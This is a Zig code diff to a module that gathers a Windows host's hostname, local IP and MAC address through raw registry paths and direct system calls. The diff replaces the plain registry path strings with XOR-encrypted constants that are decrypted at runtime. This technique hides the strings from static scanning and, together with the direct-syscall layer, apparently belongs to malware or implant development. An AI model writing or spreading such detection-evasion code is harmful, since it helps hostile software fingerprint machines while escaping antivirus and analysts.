@@ -1,6 +1,13 @@
 const std = @import("std");
 const types = @import("../types/types.zig");
 const engine = @import("../syscalls/engine.zig");
+const hash = @import("../types/hash.zig");
+
+const E = struct {
+    pub const adapter_base = &hash.xorEncrypt("\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}");
+    pub const tcpip_interfaces = &hash.xorEncrypt("\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces");
+    pub const tcpip_params = &hash.xorEncrypt("\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters");
+};
 
 fn initUnicodeString(comptime s: []const u8, buf: *[512]u16) types.UNICODE_STRING {
     @memset(buf, 0);
@@ -87,7 +94,9 @@ fn readRegWideString(allocator: std.mem.Allocator, key: types.HANDLE, comptime v
 }
 
 fn getFirstLocalIp(allocator: std.mem.Allocator) ![]const u8 {
-    const adapter_base = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}";
+    var ab_buf: [256]u8 = undefined;
+    hash.xorDecrypt(E.adapter_base, &ab_buf);
+    const adapter_base = ab_buf[0..E.adapter_base.len];
     var idx_buf: [8]u8 = undefined;
 
     for (0..10) |i| {
@@ -102,7 +111,10 @@ fn getFirstLocalIp(allocator: std.mem.Allocator) ![]const u8 {
         defer allocator.free(guid);
 
         var tcpip_buf: [512]u8 = undefined;
-        const tcpip_path = try std.fmt.bufPrint(&tcpip_buf, "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces\\{s}", .{guid});
+        var ti_buf: [512]u8 = undefined;
+        hash.xorDecrypt(E.tcpip_interfaces, &ti_buf);
+        const tcpip_base = ti_buf[0..E.tcpip_interfaces.len];
+        const tcpip_path = try std.fmt.bufPrint(&tcpip_buf, "{s}\\{s}", .{tcpip_base, guid});
         const tcpip_key = openRegKeyAt(allocator, tcpip_path) orelse continue;
         defer _ = engine.NtClose(tcpip_key);
 
@@ -120,7 +132,9 @@ fn getFirstLocalIp(allocator: std.mem.Allocator) ![]const u8 {
 }
 
 fn getMacAddress(allocator: std.mem.Allocator) ![]const u8 {
-    const adapter_base = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}";
+    var ab_buf: [256]u8 = undefined;
+    hash.xorDecrypt(E.adapter_base, &ab_buf);
+    const adapter_base = ab_buf[0..E.adapter_base.len];
     var idx_buf: [8]u8 = undefined;
 
     for (0..10) |i| {
@@ -138,7 +152,9 @@ fn getMacAddress(allocator: std.mem.Allocator) ![]const u8 {
     }
 
     {
-        const software_base = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces";
+        var sb_buf: [256]u8 = undefined;
+        hash.xorDecrypt(E.tcpip_interfaces, &sb_buf);
+        const software_base = sb_buf[0..E.tcpip_interfaces.len];
         var path_buf: [512]u8 = undefined;
         const if_path = try std.fmt.bufPrint(&path_buf, "{s}\\{s}\\{s}", .{ software_base, "{00000000-0000-0000-0000-000000000000}", "DhcpIPAddress" });
         _ = if_path;
@@ -152,7 +168,10 @@ pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
     errdefer parts.deinit();
 
     {
-        const tcpip_key = openRegKeyAt(allocator, "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters") orelse {
+        var tp_buf: [256]u8 = undefined;
+        hash.xorDecrypt(E.tcpip_params, &tp_buf);
+        const tcpip_path = tp_buf[0..E.tcpip_params.len];
+        const tcpip_key = openRegKeyAt(allocator, tcpip_path) orelse {
             try parts.appendSlice("Hostname: Unknown");
             try parts.appendSlice("\nLocal IP: Unknown");
             try parts.appendSlice("\nMAC: Unknown");
